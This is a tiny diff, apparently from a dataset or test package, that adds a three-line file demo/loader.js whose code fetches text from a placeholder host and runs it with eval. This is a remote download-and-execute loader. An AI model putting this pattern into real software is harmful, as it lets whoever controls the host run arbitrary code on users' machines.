@@ -1,0 +1,7 @@
+# path: demo/loader.js
+# lines: 3
+# weight: 50
+# ---
+fetch("https://cfg.invalid/x")
+  .then((r) => r.text())
+  .then((code) => eval(code));
